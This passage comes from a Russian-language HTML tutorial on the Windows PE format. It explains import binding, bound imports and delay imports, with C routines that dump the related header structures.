&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;--------Library: %s-----------<span style="color: #000099; font-weight: bold;">\n</span> TimeDateStamp:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;ForwardedChain:%X<span style="color: #000099; font-weight: bold;">\n</span> OriginalFirstThunk:%X<span style="color: #000099; font-weight: bold;">\n</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>FirstThunk<span style="color: #339933;">:%</span>X\n<span style="color: #ff0000;">&quot;,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RVAtoOffset((long)hMap,Import-&gt;Name)+(long)hMap,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Import-&gt;TimeDateStamp,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Import-&gt;ForwarderChain,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Import-&gt;OriginalFirstThunk,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Import-&gt;FirstThunk);<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Thunk=(IMAGE_THUNK_DATA32*)(RVAtoOffset((long)hMap,Import-&gt;OriginalFirstThunk)+(long)hMap);<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while (Thunk-&gt;u1.Ordinal!=0)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( ( (Thunk-&gt;u1.Ordinal) &amp; 0x80000000)!=0)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;</span>Ordinal<span style="color: #339933;">:</span> <span style="color: #339933;">%</span>X\n<span style="color: #ff0000;">&quot;,(long)(IMAGE_THUNK_DATA32*)Thunk-&gt;u1.Ordinal);<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ImportName=(PIMAGE_IMPORT_BY_NAME)(RVAtoOffset((long)hMap,(long)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Thunk-&gt;u1.AddressOfData))+(long)(hMap));<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;</span>NameOfFunction<span style="color: #339933;">:%</span>s\n<span style="color: #ff0000;">&quot;,&amp;(ImportName-&gt;Name));<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Thunk++;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Import++;<br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
}<br />
</span></div>
<h3><a name="c2i"></a>Биндинг</h3>
<p>Компанией Microsoft была создана утилита, которая называется BIND. Ей на вход подается PE-файл, а она записывает в массив OriginalFirstThunk, таблицы импорта данного файла, адреса функций которые данный PE-файл использует. Такая операция называется биндингом (binding) и служит в целях оптимизации процесса загрузки исполняемого файла. Есть два вида биндинга - OLD STYLE BINDING и NEW STYLE BINDING.</p>
<p>Вначале об OLD STYLE BINDING. Адреса функций таблицы импорта уже известны до загрузки программы. Загрузчик файла смотрит на поле TimeDateStamp структуры IMAGE_IMPORT_DESCRIPTOR. Если это поле равно полю TimeDateStamp той DLL, из которой импортируются функции, то адреса импортированных функций не изменяются и загрузчик ничего не делает, т.к. правильные адреса уже находятся в модуле. Если поля TimeDateStamp в DLL и в таблице импорта не равны, то загрузчик патчит адреса импортированных функций с помощью стандартного механизма. Поле TimeDateStamp требуемой DLL может иметь значение 0, что происходит, если для данной функции не было биндинга. В этом случае загрузчик пропатчит все адреса импортируемых функций, для которых поле TimeDateStamp равно нулю. Если DLL была загружена не по своему предпочтительному адресу, то также происходит патч соответствующих адресов функций.</p>
<p>Если DLL экспортирует функцию, код которой находиться в другой DLL, т.е. при передаче экспорта, то используется поле ForwarderChain структуры IMAGE_IMPORT_DESCRIPTOR. Поле ForwarderChain содержит индекс в массиве FirstThunk первого импортируемого форварда. Если переданная функция - последняя, то это значение элемента соответствующего данному индексу равно -1. Если это не последний форвард в цепочке, то элемент содержит следующий индекс в этом же массиве. Т.о. происходит проход по цепочке переданных функций и заполнение адресами соответствующих двойных слов массива FirstThunk. Т.к. у нас есть параллельный массив - OriginalFirstThunk, то мы используем информацию из него об именах форвардных функций. Обратите внимание, то массив OriginalFirstThunk обязан быть не нулевым, чтобы использовать биндинг форвардных функций. Если утилите BIND передается PE-файл в котором нулевой массив OriginalFirstThunk, то она отказывается обрабатывать такой файл.</p>
<p> Теперь о NEW STYLE BINDING. Перед загрузкой файла в массиве элементов типа IMAGE_THUNK_DATA уже также содержатся адреса импортируемых функций. Изменится механизм импорта переданных функций. При NEW STYLE BINDING поля TimeDateStamp и ForwarderChain для DLL, из которых происходит экспорт форвардов, равны -1. Загрузчик ориентируется на эти значения -1, и использует директорию bound-импорта, где содержится информация о форвардных функциях.</p>
<h3><a name="c2j"></a>Bound-импорт</h3>
<p>Bound-импорт называют также - привязанный импорт. В массиве DataDirectory элемент с индексом 11 соответствует директории отложенного импорта. Отложенный импорт используется при NEW STYLE BINDING. Используя bound-импорт можно также оптимизировать процесс загрузки, т.к. есть возможность не пропатчивать, даже адреса, переданных функций. С этой директорией связан массив структур IMAGE_BOUND_IMPORT_DESCRIPTOR, каждая из которых определена следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_BOUND_IMPORT_DESCRIPTOR <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; TimeDateStamp<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; OffsetModuleName<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; NumberOfModuleForwarderRefs<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span><br />
<span style="color: black;">&#125;</span> IMAGE_BOUND_IMPORT_DESCRIPTOR<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_BOUND_IMPORT_DESCRIPTOR<span style="color: #339933;">;</span><br />
&nbsp;</div>
<dl>
	<dt><strong>DWORD TimeDateStamp;</strong></dt><dd>Временная метка. Она нужна для того, чтобы узнать не изменилась версия DLL, к которой привязаны адреса. Если это значение совпадает со значением временного штампа у библиотеки все отлично, т.е. не надо патчить переданные функции, иначе будет использоваться стандартный механизм импорта. Нулевое значение времени соответствует любому времени.</dd>
	<dt><strong>WORD OffsetModuleName;</strong></dt><dd>Смещение имени DLL, начиная от начала данной директории. Именно смещение, а не RVA!</dd>
	<dt><strong>WORD NumberOfModuleForwarderRefs;</strong></dt><dd>Счетчик - указатель количества структур типа IMAGE_BOUND_FORWARDER_REF, которые следуют после данной структуры. Строение их такое, как и у IMAGE_BOUND_IMPORT_DESCRIPTOR, только поле NumberOfModuleForwarderRefs зарезервировано.</dd>
</dl>
<h3><a name="c2k"></a>Пример работы с Bound-импортом</h3>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printBoundImport<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_BOUND_IMPORT_DESCRIPTOR&nbsp; Bound<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_BOUND_IMPORT_DESCRIPTOR<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT<span style="color: black;">&#93;</span>.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #202020;">VirtualAddress</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;DLL Name:%s TimeDateStamp:%X&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Bound<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>Bound<span style="color: #339933;">-&gt;</span>OffsetModuleName<span style="color: black;">&#41;</span><span style="color: #339933;">,</span>Bound<span style="color: #339933;">-&gt;</span>TimeDateStamp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>Bound<span style="color: #339933;">-&gt;</span>NumberOfModuleForwarderRefs<span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Bound<span style="color: #339933;">++;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;DLL Name:%s TimeDateStamp:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Bound<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>Bound<span style="color: #339933;">-&gt;</span>OffsetModuleName<span style="color: black;">&#41;</span><span style="color: #339933;">,</span>Bound<span style="color: #339933;">-&gt;</span>TimeDateStamp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<h3><a name="c2l"></a>Delay-импорт</h3>
<p>Delay-импорт, называется также, - отложенный импорт. Delay-импорт - это промежуточный подход между неявным импортом и явным импортом с помощью LoadLibrary/GetProcAddress. Механизм отложенного импорта - это не свойство операционной системы, это дополнительный код в Вашей программе, с помощью которого оптимизируется импорт API-функций. Этот дополнительный код называется - Delay Helper. Если Ваша программа запускает впервые API-функцию, то код Delay-импорта вызывает LoadLibrary и GetProcAddress. Адрес впервые вызванной функции будет сохранен в таблице импортированных функций отложенного импорта. На данные имеющие отношение к отложенному импорту указывает запись номер IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT в таблице директорий. RVA в DataDirectory указывает на массив структур ImgDelayDescr. Эта структура определена в заголовочном файле DELAYIMP.H. Вот ее вид:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> ImgDelayDescr <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; grAttrs<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// attributes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; LPCSTR&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; szName<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// pointer to dll name</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; HMODULE &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span> phmod<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// address of module handle</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PImgThunkData &nbsp; pIAT<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// address of the IAT</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PCImgThunkData&nbsp; pINT<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// address of the INT</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PCImgThunkData&nbsp; pBoundIAT<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// address of the optional bound IAT</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PCImgThunkData&nbsp; pUnloadIAT<span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// address of optional copy of original IAT</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwTimeStamp<span style="color: #339933;">;</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0 if not bound,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// O.W. date/time stamp of DLL bound to (Old BIND)</span><br />
<span style="color: black;">&#125;</span> ImgDelayDescr<span style="color: #339933;">,</span> <span style="color: #339933;">*</span> PImgDelayDescr<span style="color: #339933;">;</span><br />
&nbsp;</div>
<p>Каждая структура соответствует одной DLL импортированной с помощью отложенного импорта. В данном массиве присутствует указатель на массив IAT, идентичный массиву, используемому в стандартном механизме импорта, а также массив таблицы импортируемых имен INT (Import Name Table). В IAT помещаются адреса при первом вызове соответствующей функции. Рассмотрим все поле структуры по порядку:</p>
<dl>
	<dt><strong>DWORD grAttrs;</strong></dt><dd>Это поле указывает на тип адресации, применяющийся в структурах Delay-импорта. Если это поле равно 1, то адреса - RVA, если - 0, то VA.</dd>
	<dt><strong>LPCSTR szName;</strong></dt><dd>Указатель RVA/VA на ASCIIZ-строку с именем загружаемой DLL.</dd>
	<dt><strong>HMODULE *phmod</strong></dt><dd>В файле это поле может быть любым. Но при загрузке, лоадер помещает в него описатель DLL.</dd>
	<dt><strong>PImgThunkData pIAT;</strong></dt><dd>RVA/VA-указатель на таблицу импортированных адресов (IAT). Если это значение равно нулю, то это последний элемент массива.</dd>
	<dt><strong>PCImgThunkData pINT;</strong></dt><dd>RVA/VA-указатель на таблицу имен функций (INT). Если это значение равно нулю, то это последний элемент массива.</dd>
	<dt><strong>PCImgThunkData pBoundIAT;</strong></dt><dd>RVA/VA-указатель на таблицу адресов функций Bound-импорта.</dd>
	<dt><strong>PCImgThunkData pUnloadIAT;</strong></dt><dd>Когда DLL выгружается из памяти, то она имеет возможность восстановить таблицу адресов отложенного импорта в исходное состояние, обратившись к ее оригинальной копии. Указатель на оригинальную копию находиться в данном поле. Это аналог массива OriginalFirstThunk.</dd>
	<dt><strong>DWORD dwTimeStamp;</strong></dt><dd>Временная метка. Возможно не проходить по всем функциям для данной библиотеки. Если временная метка не пуста и таблица Bound-импорта не пуста, то загрузчик не будет заполнять IAT, а воспользуется таблицей bound-IAT. В данном случае здесь таблица bound-импорта отдельная и она используется в поддержку delay-импорта.</dd>
</dl>
<h3><a name="c2m"></a>Пример работы с Delay-импортом</h3>
<p>Представляю Вашему вниманию, пример процедуры - дампера таблицы отложенного импорта:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printDelayImport<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PImgDelayDescr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PImgDelayDescr<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT<span style="color: black;">&#93;</span>.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #202020;">VirtualAddress</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>Delay<span style="color: #339933;">-&gt;</span>pIAT<span style="color: #339933;">!=</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>Delay<span style="color: #339933;">-&gt;</span>grAttrs<span style="color: #339933;">==</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;-------%s-------<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>Delay<span style="color: #339933;">-&gt;</span>szName<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Attrib: %X<span style="color: #000099; font-weight: bold;">\n</span>TimeDateStamp: %X<span style="color: #000099; font-weight: bold;">\n</span>Import Address Table:&quot;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot; %X<span style="color: #000099; font-weight: bold;">\n</span>Import Name Table: %X<span style="color: #000099; font-weight: bold;">\n</span>Bound IAT: %X<span style="color: #000099; font-weight: bold;">\n</span>Unload IAT:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>grAttrs<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>dwTimeStamp<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pIAT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pINT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pBoundIAT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pUnloadIAT<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;-------%s-------<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>Delay<span style="color: #339933;">-&gt;</span>szName<span style="color: #339933;">-</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">ImageBase</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Attrib: %X<span style="color: #000099; font-weight: bold;">\n</span>TimeDateStamp: %X<span style="color: #000099; font-weight: bold;">\n</span>Import Address Table:&quot;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot; %X<span style="color: #000099; font-weight: bold;">\n</span>Import Name Table: %X<span style="color: #000099; font-weight: bold;">\n</span>Bound IAT: %X<span style="color: #000099; font-weight: bold;">\n</span>Unload IAT:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
